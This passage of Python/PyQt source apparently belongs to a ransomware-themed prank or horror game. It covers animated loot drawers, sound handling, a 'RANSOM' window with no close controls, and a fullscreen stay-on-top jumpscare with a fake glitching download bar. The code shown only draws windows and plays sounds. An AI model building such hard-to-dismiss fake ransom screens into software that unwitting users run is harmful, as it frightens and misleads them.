DRAWER_COLOR_BG          = '#FF0000'   # loud red client area
DRAWER_COLOR_SLOT        = '#DA0000'   # slot body
DRAWER_COLOR_SLOT_HOVER  = '#940000'   # hover state
DRAWER_COLOR_SLOT_READY  = '#460000'   # opened / ready state
DRAWER_COLOR_BORDER      = '#330000'   # outer dialog shadow line
DRAWER_COLOR_BEVEL_HI    = '#FF3131'   # top/left highlight bevel
DRAWER_COLOR_BEVEL_LO    = '#501111'   # bottom/right shadow bevel
DRAWER_COLOR_HEADER      = '#8B0000'   # dark-red title strip
DRAWER_COLOR_HEADER_HI   = '#B01010'   # top/left highlight on title strip
DRAWER_COLOR_HEADER_LO   = '#400000'   # bottom/right shadow on title strip
DRAWER_COLOR_TEXT        = '#FFFFFF'   # plain white text
DRAWER_COLOR_TEXT_DIM    = '#5E0000'
DRAWER_COLOR_HEADER_TEXT = '#FFFFFF'   # white text on dark red

punish = False
success_window = None
lose_jumpscare_window = None
sound_manager = None
event_controller = None
ransom_flash_overlay = None


def resource_path(filename):
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, filename)


def load_pixmap(filename):
    path = resource_path(filename)
    image = QImage(path)
    if image.isNull():
        return QPixmap()
    else:
        image = image.convertToFormat(QImage.Format_RGBA8888)
        return QPixmap.fromImage(image)


# ---------------------------------------------------------------------------
# Drawer icon cache
# ---------------------------------------------------------------------------

_DRAWER_ICON_CACHE = {}


def _drawer_icon(filename, size):
    key = (filename, size)
    if key in _DRAWER_ICON_CACHE:
        return _DRAWER_ICON_CACHE[key]
    pm = load_pixmap(filename)
    if not pm.isNull():
        pm = pm.scaled(size, size,
                       Qt.KeepAspectRatio, Qt.SmoothTransformation)
    _DRAWER_ICON_CACHE[key] = pm
    return pm


def _drawer_roll():
    r = random.random()
    acc = 0.0
    for name, p in DRAWER_ROLL_TABLE:
        acc += p
        if r < acc:
            return name
    return DRAWER_ROLL_TABLE[-1][0]


# ---------------------------------------------------------------------------
# Drawer slot
# ---------------------------------------------------------------------------

class DrawerSlot(QFrame):
    """One collapsible compartment inside a drawer window.

    Looks like a plain Windows 95 push-panel: flat grey with a 3D
    raised bevel when closed, sunken when open.
    """

    opened = pyqtSignal()
    claimed = pyqtSignal(str)
    height_changed = pyqtSignal(int)

    def __init__(self, parent=None, index=0):
        super().__init__(parent)
        self.index = index
        self.is_open = False
        self.claimed_content = None
        self.content = None

        self.setStyleSheet(self._style_closed())
        self.setMouseTracking(True)

        self.label = QLabel(f'secondchance.slot{index + 1}', self)
        self.label.setStyleSheet(
            f'color: {DRAWER_COLOR_TEXT};'
            f'background: transparent;'
            f'border: none;'
            f'font-family: {DRAWER_FONT};'
            f'font-size: 12px;'
        )
        self.label.setAlignment(Qt.AlignCenter)

        self.content_frame = QFrame(self)
        self.content_frame.setStyleSheet(
            'QFrame { background: transparent; border: none; }'
        )
        self.content_frame.hide()

        self.content_icon = QLabel(self.content_frame)
        self.content_icon.setAlignment(Qt.AlignCenter)
        self.content_icon.setStyleSheet(
            'background: transparent; border: none;'
        )

        inner = QVBoxLayout(self.content_frame)
        inner.setContentsMargins(0, 0, 0, 0)
        inner.addStretch(1)
        inner.addWidget(self.content_icon, alignment=Qt.AlignCenter)
        inner.addStretch(1)

        self.setFixedHeight(SLOT_HEIGHT_CLOSED)

    # ---- Plain Win95-style bevels ---------------------------------------
    def _bevel_raised(self, bg):
        return (
            f'QFrame {{'
            f'  background-color: {bg};'
            f'  border-top: 2px solid {DRAWER_COLOR_BEVEL_HI};'
            f'  border-left: 2px solid {DRAWER_COLOR_BEVEL_HI};'
            f'  border-bottom: 2px solid {DRAWER_COLOR_BEVEL_LO};'
            f'  border-right: 2px solid {DRAWER_COLOR_BEVEL_LO};'
            f'}}'
        )

    def _bevel_sunken(self, bg):
        return (
            f'QFrame {{'
            f'  background-color: {bg};'
            f'  border-top: 2px solid {DRAWER_COLOR_BEVEL_LO};'
            f'  border-left: 2px solid {DRAWER_COLOR_BEVEL_LO};'
            f'  border-bottom: 2px solid {DRAWER_COLOR_BEVEL_HI};'
            f'  border-right: 2px solid {DRAWER_COLOR_BEVEL_HI};'
            f'}}'
        )

    def _style_closed(self):
        return self._bevel_raised(DRAWER_COLOR_SLOT)

    def _style_hover(self):
        return self._bevel_raised(DRAWER_COLOR_SLOT_HOVER)

    def _style_ready(self):
        return self._bevel_sunken(DRAWER_COLOR_SLOT_READY)

    def _layout_children(self):
        w, h = self.width(), self.height()
        self.label.setGeometry(0, 0, w, SLOT_HEIGHT_CLOSED)
        self.content_frame.setGeometry(
            0, SLOT_HEIGHT_CLOSED, w, max(0, h - SLOT_HEIGHT_CLOSED)
        )

    def resizeEvent(self, event):
        self._layout_children()
        event.accept()

    def mousePressEvent(self, event):
        if event.button() != Qt.LeftButton:
            return super().mousePressEvent(event)

        if not self.is_open:
            self._open_drawer()
            event.accept()
            return

        y = event.pos().y()
        if y >= SLOT_HEIGHT_CLOSED and self.claimed_content is None:
            self._claim_content()
        event.accept()

    def enterEvent(self, event):
        if not self.is_open:
            self.setStyleSheet(self._style_hover())
        elif self.claimed_content is None:
            self.setStyleSheet(self._style_ready())
        super().enterEvent(event)

    def leaveEvent(self, event):
        self.setStyleSheet(self._style_closed())
        super().leaveEvent(event)

    def _open_drawer(self):
        if self.is_open:
            return
        self.is_open = True
        self.content = _drawer_roll()
        self._populate_content()

        self.label.hide()
        self.content_frame.show()
        self._layout_children()
        self.setStyleSheet(self._style_ready())
        try:
            sound_manager.play_effect('drawer.mp3')
        except Exception:
            pass
        self.opened.emit()

        self._reveal_anim = QPropertyAnimation(self, b'minimumHeight', self)
        self._reveal_anim.setDuration(SLOT_ANIM_MS)
        self._reveal_anim.setStartValue(SLOT_HEIGHT_CLOSED)
        self._reveal_anim.setEndValue(SLOT_HEIGHT_OPEN)
        self._reveal_anim.setEasingCurve(SLOT_ANIM_EASE)
        self._reveal_anim.valueChanged.connect(self._on_height_changed)
        self._reveal_anim.start()

    def _on_height_changed(self, value):
        h = int(value)
        self.setFixedHeight(h)
        self._layout_children()
        self.height_changed.emit(h)

    def _populate_content(self):
        coin_pm = _drawer_icon('coin.jpg', DRAWER_ICON_SIZE)
        trap_pm = _drawer_icon('stop_sign.png', DRAWER_ICON_SIZE)
        if self.content == 'COIN':
            if not coin_pm.isNull():
                self.content_icon.setPixmap(coin_pm)
            else:
                self.content_icon.setText('\u2022')
                self.content_icon.setStyleSheet(
                    f'color: {DRAWER_COLOR_TEXT};'
                    f'background: transparent;'
                    f'border: none;'
                    f'font-family: {DRAWER_FONT};'
                    f'font-size: 40px;'
                )
        elif self.content == 'TRAP':
            if not trap_pm.isNull():
                self.content_icon.setPixmap(trap_pm)
            else:
                self.content_icon.setText('X')
                self.content_icon.setStyleSheet(
                    f'color: {DRAWER_COLOR_TEXT};'
                    f'background: transparent;'
                    f'border: none;'
                    f'font-family: {DRAWER_FONT};'
                    f'font-size: 40px;'
                    f'font-weight: bold;'
                )
        else:
            self.content_icon.clear()

    def _claim_content(self):
        if self.claimed_content is not None:
            return
        self.claimed_content = self.content
        self.setStyleSheet(self._style_closed())
        try:
            effect = QGraphicsOpacityEffect(self.content_icon)
            effect.setOpacity(0.35)
            self.content_icon.setGraphicsEffect(effect)
        except Exception:
            pass
        self.claimed.emit(self.claimed_content)


# ---------------------------------------------------------------------------
# Drawer window
# ---------------------------------------------------------------------------

class DrawerWindow(QWidget):
    """Plain Windows 95/2000 style dialog containing three drawer
    slots. Native Aero title bar is stripped down so only the title
    text + drag remain. Inside, a flat grey client area with a navy
    header strip and classic 3D bevels."""

    slot_claimed = pyqtSignal(str)
    all_claimed = pyqtSignal()
    linger_expired = pyqtSignal()

    def __init__(self, index=1):
        super().__init__()
        self.index = index
        self.setWindowFlags(
            Qt.Window
            | Qt.WindowStaysOnTopHint
            | Qt.WindowTitleHint
            | Qt.CustomizeWindowHint
        )
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.setWindowTitle(f'Drawer {index}')
        self.setFixedWidth(DRAWER_W)
        self.setStyleSheet(
            f'DrawerWindow {{'
            f'  background-color: {DRAWER_COLOR_BG};'
            f'}}'
            f'QWidget {{'
            f'  font-family: {DRAWER_FONT};'
            f'}}'
        )

        # ---- Navy title strip (fakes a Win95 dialog title bar) ---------
        self.header = QFrame(self)
        self.header.setStyleSheet(
            f'QFrame {{'
            f'  background-color: {DRAWER_COLOR_HEADER};'
            f'  border: none;'
            f'}}'
        )
        self.title = QLabel(f'Drawer {index}', self.header)
        self.title.setStyleSheet(
            f'color: {DRAWER_COLOR_HEADER_TEXT};'
            f'background: transparent;'
            f'border: none;'
            f'font-family: {DRAWER_FONT};'
            f'font-size: 12px;'
            f'font-weight: bold;'
        )
        self.title.setAlignment(Qt.AlignVCenter | Qt.AlignLeft)

        hlay = QHBoxLayout(self.header)
        hlay.setContentsMargins(6, 3, 6, 3)
        hlay.setSpacing(4)
        hlay.addWidget(self.title)
        hlay.addStretch(1)

        # ---- Slots ------------------------------------------------------
        self.slots = []
        for i in range(SLOT_COUNT):
            slot = DrawerSlot(self, index=i)
            slot.claimed.connect(self._on_slot_claimed_inner)
            slot.opened.connect(self._on_slot_opened_inner)
            slot.height_changed.connect(self._refresh_size)
            self.slots.append(slot)

        self.linger_timer = QTimer(self)
        self.linger_timer.setSingleShot(True)
        self.linger_timer.timeout.connect(self._on_linger)

        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(6)
        layout.addWidget(self.header)
        for slot in self.slots:
            layout.addWidget(slot)

        self._refresh_size()
        self._fade = None

    def showEvent(self, event):
        super().showEvent(event)
        _make_aero_window(self, dark=True)

    def _refresh_size(self, *_):
        hint = self.layout().sizeHint()
        self.setFixedHeight(hint.height())

    def full_open_height(self):
        return self.height() + SLOT_COUNT * (SLOT_HEIGHT_OPEN
                                             - SLOT_HEIGHT_CLOSED)

    def _on_slot_opened_inner(self):
        if all(s.is_open for s in self.slots):
            self.linger_timer.start(DRAWER_LINGER_MS)

    def _on_slot_claimed_inner(self, content):
        self.slot_claimed.emit(content)
        if all(s.claimed_content is not None for s in self.slots):
            self.linger_timer.stop()
            self.all_claimed.emit()

    def _on_linger(self):
        self.linger_expired.emit()

    def close_animated(self):
        if self._fade is not None:
            return
        try:
            effect = QGraphicsOpacityEffect(self)
            effect.setOpacity(1.0)
            self.setGraphicsEffect(effect)
            self._fade = QPropertyAnimation(effect, b'opacity', self)
            self._fade.setDuration(220)
            self._fade.setStartValue(1.0)
            self._fade.setEndValue(0.0)
            self._fade.finished.connect(self.close)
            self._fade.start()
        except Exception:
            self.close()


# ---------------------------------------------------------------------------
# Sound manager
# ---------------------------------------------------------------------------

class SoundManager:
    """SoundManager"""
    def __init__(self):
        self.music = QMediaPlayer()
        self.ticking = QMediaPlayer()
        self.success = QMediaPlayer()
        self.effect_players = []
        for _ in range(6):
            player = QMediaPlayer()
            player.setVolume(100)
            self.effect_players.append(player)
        self.effect_index = 0
        self.sound_effects = {}
        self.media_cache = {}
        self.pending_music = None
        self.pending_ticking = False
        self.pending_success = False
        self.sound_files = ['start.mp3', 'fail.mp3', 'realscare.wav', 'time_ticking.wav', 'da song.mp3', 'success.mp3', 'coin_sound.mp3', 'laugh1.mp3', 'laugh2.mp3', 'blip.mp3','drawer.mp3']
        for filename in self.sound_files:
            self.preload_sound(filename)
        self.preload_sound_effect('realscare.wav')
        self.preload_sound_effect('time_ticking.wav')
        self.music.mediaStatusChanged.connect(self.music_media_status_changed)
        self.ticking.mediaStatusChanged.connect(self.ticking_media_status_changed)
        self.success.mediaStatusChanged.connect(self.success_media_status_changed)
        QTimer.singleShot(50, self.warmup_audio)

    def preload_sound(self, filename):
        if filename in self.media_cache:
            return self.media_cache[filename]
        else:
            path = resource_path(filename)
            if not os.path.exists(path):
                print(f'ERROR: Sound file not found: {path}')
                return
            else:
                media = QMediaContent(QUrl.fromLocalFile(path))
                self.media_cache[filename] = media
                return media

    def preload_sound_effect(self, filename):
        if filename in self.sound_effects:
            return self.sound_effects[filename]
        else:
            path = resource_path(filename)
            if not os.path.exists(path):
                print(f'ERROR: Sound file not found: {path}')
                return
            else:
                effect = QSoundEffect()
                effect.setSource(QUrl.fromLocalFile(path))
                effect.setVolume(1.0)
                self.sound_effects[filename] = effect
                return effect

    def warmup_audio(self):
        media = self.media_cache.get('da song.mp3')
        if media is not None:
            self.music.setMedia(media)
            self.music.setVolume(100)
        media = self.media_cache.get('time_ticking.wav')
        if media is not None:
            self.ticking.setMedia(media)
            self.ticking.setVolume(100)
        media = self.media_cache.get('success.mp3')
        if media is not None:
            self.success.setMedia(media)
            self.success.setVolume(100)
        warm_media = self.media_cache.get('blip.mp3')
        if warm_media is not None:
            for player in self.effect_players:
                player.setMedia(warm_media)
                player.setVolume(100)

    def play_music(self, filename):
        media = self.preload_sound(filename)
        if media is None:
            return
        else:
            self.pending_music = media
            self.music.stop()
            self.music.setMedia(media)
            self.music.setVolume(100)
            if self.music.mediaStatus() in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                self.pending_music = None
                self.music.play()

    def music_media_status_changed(self, status):
        if status in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia) and self.pending_music is not None:
            self.pending_music = None
            self.music.setVolume(100)
            self.music.play()

    def stop_music(self):
        self.pending_music = None
        self.music.stop()

    def play_ticking(self):
        if self.ticking.state() == QMediaPlayer.PlayingState:
            return
        else:
            effect = self.sound_effects.get('time_ticking.wav')
            if effect is not None:
                effect.setLoopCount(QSoundEffect.Infinite)
                effect.setVolume(1.0)
                effect.play()
                return
            else:
                media = self.preload_sound('time_ticking.wav')
                if media is None:
                    return
                else:
                    self.pending_ticking = True
                    self.ticking.stop()
                    self.ticking.setMedia(media)
                    self.ticking.setVolume(100)
                    if self.ticking.mediaStatus() in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                        self.pending_ticking = False
                        self.ticking.play()

    def ticking_media_status_changed(self, status):
        if status in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia) and self.pending_ticking:
            self.pending_ticking = False
            self.ticking.setVolume(100)
            self.ticking.play()

    def stop_ticking(self):
        self.pending_ticking = False
        effect = self.sound_effects.get('time_ticking.wav')
        if effect is not None:
            effect.stop()
        self.ticking.stop()

    def play_effect(self, filename):
        if filename.lower().endswith('.wav'):
            effect = self.sound_effects.get(filename)
            if effect is None:
                effect = self.preload_sound_effect(filename)
            if effect is not None:
                effect.setLoopCount(1)
                effect.setVolume(1.0)
                effect.play()
                return
        media = self.preload_sound(filename)
        if media is None:
            return
        else:
            player = None
            for candidate in self.effect_players:
                if candidate.state() != QMediaPlayer.PlayingState:
                    player = candidate
                    break
            if player is None:
                player = self.effect_players[self.effect_index]
                self.effect_index = (self.effect_index + 1) % len(self.effect_players)
            player.stop()
            player.setMedia(media)
            player.setVolume(100)
            if player.mediaStatus() in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                player.play()
            else:
                def play_when_loaded(status, p=player):
                    if status in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                        try:
                            p.play()
                            p.mediaStatusChanged.disconnect(play_when_loaded)
                        except RuntimeError:
                            return None
                player.mediaStatusChanged.connect(play_when_loaded)

    def play_success(self):
        media = self.preload_sound('success.mp3')
        if media is None:
            return
        else:
            self.pending_success = True
            self.success.stop()
            self.success.setMedia(media)
            self.success.setVolume(100)
            if self.success.mediaStatus() in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                self.pending_success = False
                self.success.play()

    def success_media_status_changed(self, status):
        if status in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia) and self.pending_success:
            self.pending_success = False
            self.success.setVolume(100)
            self.success.play()
        else:
            if status == QMediaPlayer.EndOfMedia:
                QTimer.singleShot(100, QApplication.quit)

    def stop_all(self):
        self.pending_music = None
        self.pending_ticking = False
        self.pending_success = False
        self.music.stop()
        self.ticking.stop()
        self.success.stop()
        for player in self.effect_players:
            player.stop()
        for effect in self.sound_effects.values():
            try:
                effect.stop()
            except Exception:
                pass

    __classdictcell__ = None


class SuccessWindow(QWidget):
    """SuccessWindow with an Aero title bar (no close/min/max)."""
    def __init__(self):
        super().__init__()
        self.setWindowTitle('RANSOM')
        self.setWindowFlags(
            Qt.Window
            | Qt.WindowTitleHint
            | Qt.CustomizeWindowHint
        )
        self.resize(700, 500)
        self.setStyleSheet('background-color: black;')
        self.image = QLabel(self)
        self.image.setAlignment(Qt.AlignCenter)
        self.image.setGeometry(0, 0, self.width(), self.height())
        self.update_image()
        self.image.show()
        sound_manager.play_success()

    def showEvent(self, event):
        super().showEvent(event)
        _make_aero_window(self, dark=True)

    def update_image(self):
        pixmap = load_pixmap('success.png')
        if not pixmap.isNull():
            pixmap = pixmap.scaled(self.width(), self.height(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self.image.setPixmap(pixmap)

    def resizeEvent(self, event):
        self.image.setGeometry(0, 0, self.width(), self.height())
        self.update_image()
        event.accept()


class JumpscareWindow(QWidget):
    """JumpscareWindow"""
    def __init__(self, image_path):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setStyleSheet('background-color: rgb(90, 0, 0);')
        self.showFullScreen()
        self.original_pixmap = load_pixmap(image_path)
        self.static_background = QLabel(self)
        self.static_background.setGeometry(0, 0, self.width(), self.height())
        self.static_background.setScaledContents(True)
        self.static_background.show()
        self.static_background.lower()
        self.static_timer = QTimer(self)
        self.static_timer.timeout.connect(self.make_static)
        self.static_timer.start(35)
        self.make_static()
        self.image = QLabel(self)
        self.image.setAttribute(Qt.WA_TranslucentBackground)
        self.image.setStyleSheet('background: transparent; border: none;')
        self.image.setAlignment(Qt.AlignCenter)
        self.start_width = self.original_pixmap.width()
        self.start_height = self.original_pixmap.height()
        self.start_scale = 1.3
        self.end_scale = 2.5
        self.elapsed = 0
        self.progress_background = QLabel(self)
        self.progress_background.setStyleSheet('\n\t\t\tbackground-color: rgb(20, 20, 20);\n\t\t\tborder: 3px solid rgb(0, 0, 0);\n\t\t\t')
        self.progress_background.hide()
        self.progress_fill = QLabel(self.progress_background)
        self.progress_fill.setStyleSheet('background-color: rgb(255, 255, 255);')
        self.download_label = QLabel('DOWNLOADING...', self)
        self.download_label.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tfont-size: 28px;\n\t\t\tfont-weight: bold;\n\t\t\tbackground: transparent;\n\t\t\t')
        self.download_label.adjustSize()
        self.download_label.hide()
        self.percent_label = QLabel('0%', self)
        self.percent_label.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tfont-size: 24px;\n\t\t\tfont-weight: bold;\n\t\t\tbackground: transparent;\n\t\t\t')
        self.percent_label.adjustSize()
        self.percent_label.hide()
        self.glitch_labels = []
        glitch_texts = ['DOWNLOADING...', 'D0WNLOAD1NG...', 'DOWNL0ADING...', 'DOWNLOAD_', 'DOWNLOAD ERROR', 'DOWNLOADING', 'D0WNLOAD', 'DOWNLOAD...', 'DOWNLOADING..', 'D0WNLOAD1NG', 'DOWNLOAD FILE', 'DOWNLOADING DATA']
        for _ in range(8):
            label = QLabel(random.choice(glitch_texts), self)
            label.setStyleSheet(f'\n\t\t\t\tcolor: rgb(\n\t\t\t\t\t{random.randint(180, 255)},\n\t\t\t\t\t{random.randint(180, 255)},\n\t\t\t\t\t{random.randint(180, 255)}\n\t\t\t\t);\n\t\t\t\tfont-size: {random.randint(24, 50)}px;\n\t\t\t\tfont-weight: bold;\n\t\t\t\tbackground: transparent;\n\t\t\t\t')
            label.adjustSize()
            label.hide()
            self.glitch_labels.append(label)
        self.download_timer = None
        self.download_elapsed = 0
        self.download_progress = 0
        self.animation_timer = QTimer(self)
        self.animation_timer.timeout.connect(self.animate)
        self.animation_timer.start(16)

    def make_static(self):
        width = 160
        height = 90
        image = QImage(width, height, QImage.Format_RGB32)
        for y in range(height):
            for x in range(width):
                noise = random.randint((-35), 35)
                r = max(0, min(255, 65 + noise))
                g = max(0, min(255, 2 + noise // 4))
                b = max(0, min(255, 2 + noise // 4))
                image.setPixelColor(x, y, QColor(r, g, b))
        image = image.scaled(self.width(), self.height(), Qt.IgnoreAspectRatio, Qt.FastTransformation)
        self.static_background.setPixmap(QPixmap.fromImage(image))

    def animate(self):
        self.elapsed += 16
        progress = min(self.elapsed / 1000, 1.0)
        scale = self.start_scale + (self.end_scale - self.start_scale) * progress
        width = int(self.start_width * scale)
        height = int(self.start_height * scale)
        pixmap = self.original_pixmap.scaled(width, height, Qt.KeepAspectRatio, Qt.FastTransformation)
        self.image.setPixmap(pixmap)
        self.image.resize(width, height)
        shake = int(8 + 35 * progress)
        center_x = (self.width() - width) // 2
        center_y = (self.height() - height) // 2
        self.image.move(center_x + random.randint(-shake, shake), center_y + random.randint(-shake, shake))
        self.image.show()
        self.image.raise_()
        if progress >= 1:
            self.animation_timer.stop()
            self.image.move(center_x, center_y)
            QTimer.singleShot(100, self.start_download)

    def start_download(self):
        self.image.hide()
        self.static_timer.stop()
        self.static_background.setStyleSheet('background-color: rgb(55, 0, 0);')
        self.static_background.setPixmap(QPixmap())
        self.static_background.show()
        self.static_background.lower()
        self.download_elapsed = 0
        self.download_progress = 0
        self.progress_background.setGeometry((self.width() - 600) // 2, (self.height() - 45) // 2, 600, 45)
        self.progress_fill.setGeometry(0, 0, 0, 45)
        self.progress_background.show()
        self.download_label.setText('DOWNLOADING...')
        self.download_label.adjustSize()
        self.download_label.move((self.width() - self.download_label.width()) // 2, self.height() // 2 - 80)
        self.download_label.show()
        self.percent_label.setText('0%')
        self.percent_label.adjustSize()
        self.percent_label.move((self.width() - self.percent_label.width()) // 2, self.height() // 2 + 55)
        self.percent_label.show()
        for label in self.glitch_labels:
            label.show()
        self.update_glitch_text()
        self.download_timer = QTimer(self)
        self.download_timer.timeout.connect(self.update_download)
        self.download_timer.start(7)

    def update_download(self):
        self.download_elapsed += 50
        self.download_progress = min(100, self.download_elapsed / 5000 * 100)
        zoom = 1.0 + self.download_progress / 100 * 0.8
        base_width = 600
        base_height = 45
        bar_width = int(base_width * zoom)
        bar_height = int(base_height * zoom)
        bar_x = (self.width() - bar_width) // 2
        bar_y = (self.height() - bar_height) // 2
        self.progress_background.setGeometry(bar_x, bar_y, bar_width, bar_height)
        if self.download_progress >= 100:
            self.finish_download(bar_x, bar_y, bar_width, bar_height, zoom)
        else:
            normal_width = int(bar_width * self.download_progress / 100)
            glitch_strength = int(35 * zoom)
            fill_width = max(0, min(bar_width, normal_width + random.randint(-glitch_strength, glitch_strength)))
            self.progress_fill.setGeometry(0, random.randint(int((-5) * zoom), int(5 * zoom)), fill_width, random.randint(int(38 * zoom), int(52 * zoom)))
            percent = int(self.download_progress)
            if random.random() < 0.25:
                percent = max(0, min(99, percent + random.randint((-10), 10)))
            self.percent_label.setText(f'{percent}%')
            font = self.percent_label.font()
            font.setPointSize(max(1, int(24 * zoom)))
            font.setBold(True)
            self.percent_label.setFont(font)
            self.percent_label.adjustSize()
            self.percent_label.move((self.width() - self.percent_label.width()) // 2 + random.randint(int((-10) * zoom), int(10 * zoom)), bar_y + bar_height + int(55 * zoom) + random.randint(int((-5) * zoom), int(5 * zoom)))
            if random.random() < 0.35:
                self.download_label.setText(random.choice(['DOWNLOADING...', 'DOWNLOADING..', 'D0WNLOAD1NG...', 'DOWNL0ADING...', 'DOWNLOAD_', 'DOWNLOADING', 'D0WNLOAD', 'DOWNLOAD...', 'D0WNLOAD1NG', 'DOWNLOAD FILE']))
            font = self.download_label.font()
            font.setPointSize(max(1, int(28 * zoom)))
            font.setBold(True)
            self.download_label.setFont(font)
            self.download_label.adjustSize()
            self.download_label.move((self.width() - self.download_label.width()) // 2 + random.randint(int((-15) * zoom), int(15 * zoom)), bar_y - self.download_label.height() - int(20 * zoom) + random.randint(int((-8) * zoom), int(8 * zoom)))
            self.update_glitch_text()

    def finish_download(self, bar_x, bar_y, bar_width, bar_height, zoom):
        self.download_timer.stop()
        self.progress_fill.setGeometry(0, 0, bar_width, bar_height)
        self.percent_label.setText('100%')
        font = self.percent_label.font()
        font.setPointSize(int(24 * zoom))
        font.setBold(True)
        self.percent_label.setFont(font)
        self.percent_label.adjustSize()
        self.percent_label.move((self.width() - self.percent_label.width()) // 2, bar_y + bar_height + int(55 * zoom))
        for label in self.glitch_labels:
            label.hide()
        self.download_label.hide()
        self.damage_flash = QLabel(self)
        self.damage_flash.setGeometry(0, 0, self.width(), self.height())
        self.damage_flash.setStyleSheet('background-color: rgb(255, 0, 0);')
        self.damage_opacity = QGraphicsOpacityEffect(self.damage_flash)
        self.damage_flash.setGraphicsEffect(self.damage_opacity)
        self.damage_opacity.setOpacity(1)
        self.damage_flash.show()
        self.damage_fade = QPropertyAnimation(self.damage_opacity, b'opacity', self)
        self.damage_fade.setDuration(2)
        self.damage_fade.setStartValue(1)
        self.damage_fade.setEndValue(0)
        self.damage_fade.finished.connect(self.damage_flash.hide)
        self.damage_fade.start()
        QTimer.singleShot(5, self.close)

    def update_glitch_text(self):
        texts = ['DOWNLOADING...', 'DOWNLOADING..', 'D0WNLOAD1NG...', 'DOWNL0ADING...', 'DOWNLOAD_', 'DOWNLOAD ERROR', 'DOWNLOADING', 'D0WNLOAD', 'DOWNLOAD...', 'D0WNLOAD1NG', 'DOWNLOAD FILE', 'DOWNLOADING DATA']
        for label in self.glitch_labels:
            if random.random() < 0.4:
                label.setText(random.choice(texts))
                label.adjustSize()
            x = random.randint(30, max(30, self.width() - label.width() - 30))
            y = random.randint(30, max(30, self.height() - label.height() - 30))
            if self.height() // 2 - 130 < y < self.height() // 2 + 130:
                if random.random() < 0.75:
                    if random.random() < 0.5:
                        y = random.randint(30, max(30, self.height() // 2 - 150))
                    else:
                        y = random.randint(min(self.height() - 80, self.height() // 2 + 150), self.height() - 30)
            label.move(x + random.randint((-8), 8), y + random.randint((-8), 8))
            label.raise_()

    def closeEvent(self, event):
        self.animation_timer.stop()
        self.static_timer.stop()
        if self.download_timer:
            self.download_timer.stop()
        event.accept()


class RansomImageWindow(QWidget):
    """Glitch image window with vertical stretch spawn / shrink despawn."""
    def __init__(self, image_path):
        super().__init__()
        self.setWindowFlags(
            Qt.FramelessWindowHint
            | Qt.WindowStaysOnTopHint
            | Qt.Tool
            | Qt.WindowTransparentForInput
        )
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.setAttribute(Qt.WA_TransparentForMouseEvents, True)
        self.image = QLabel(self)
        self.image.setAttribute(Qt.WA_TranslucentBackground)
        self.image.setAttribute(Qt.WA_TransparentForMouseEvents, True)
        self.image.setStyleSheet('background: transparent; border: none;')

        pixmap = _GLITCH_PIXMAP_CACHE.get(image_path) or load_pixmap(image_path)
        self._full_pixmap = pixmap
        if not pixmap.isNull():
            self._orig_w = max(1, pixmap.width())
            self._orig_h = max(1, pixmap.height())
            self.image.setPixmap(pixmap)
            self.image.resize(self._orig_w, self._orig_h)
            self.resize(self._orig_w, self._orig_h)
        else:
            self._orig_w = 1
            self._orig_h = 1

        self.base_x = 0
        self.base_y = 0
        self._current_scale = 1.0
        self._anchor = 'center'
        self._spawn_anim = None
        self._despawn_anim = None

        self.shiver_timer = QTimer(self)
        self.shiver_timer.timeout.connect(self.shiver)
        self.shiver_timer.start(35)

    def reset_to_full_size(self):
        if self._full_pixmap.isNull():
            return
        self._current_scale = 1.0
        self.image.setPixmap(self._full_pixmap)
        self.image.resize(self._orig_w, self._orig_h)
        self.resize(self._orig_w, self._orig_h)

    def spawn(self):
        if self._full_pixmap.isNull():
            return
        if self._despawn_anim is not None:
            self._despawn_anim.stop()
            self._despawn_anim = None
        if self._spawn_anim is not None:
            self._spawn_anim.stop()
            self._spawn_anim = None

        self._anchor = 'center'
        self._current_scale = 0.0
        self._apply_vertical_scale(0.0)
        self.show()
        self.raise_()

        anim = QVariantAnimation(self)
        anim.setDuration(320)
        anim.setStartValue(0.0)
        anim.setEndValue(1.0)
        anim.setEasingCurve(QEasingCurve.OutCubic)
        anim.valueChanged.connect(self._apply_vertical_scale)
        anim.start()
        self._spawn_anim = anim

    def despawn(self):
        if self._full_pixmap.isNull():
            self.hide()
            return
        if self._spawn_anim is not None:
            self._spawn_anim.stop()
            self._spawn_anim = None
        if self._despawn_anim is not None:
            self._despawn_anim.stop()
            self._despawn_anim = None

        self._anchor = 'bottom'

        anim = QVariantAnimation(self)
        anim.setDuration(240)
        anim.setStartValue(1.0)
        anim.setEndValue(0.0)
        anim.setEasingCurve(QEasingCurve.InCubic)
        anim.valueChanged.connect(self._apply_vertical_scale)
        anim.finished.connect(self._on_despawn_finished)
        anim.start()
        self._despawn_anim = anim

    def _on_despawn_finished(self):
        self.hide()
        self._despawn_anim = None

    def _apply_vertical_scale(self, scale):
        try:
            s = float(scale)
        except (TypeError, ValueError):
            return
        if s < 0.0:
            s = 0.0
        elif s > 1.0:
            s = 1.0
        if self._full_pixmap.isNull():
            return

        self._current_scale = s
        h = max(1, int(self._orig_h * s))
        scaled = self._full_pixmap.scaled(
            self._orig_w, h,
            Qt.IgnoreAspectRatio, Qt.FastTransformation
        )
        self.image.setPixmap(scaled)
        self.image.resize(self._orig_w, h)
        self.resize(self._orig_w, h)
        self._reposition()

    def _reposition(self):
        h = max(1, int(self._orig_h * self._current_scale))
        if self._anchor == 'bottom':
            offset_y = self._orig_h - h
        else:
            offset_y = (self._orig_h - h) // 2
        jx = random.randint(-3, 3)
        jy = random.randint(-3, 3)
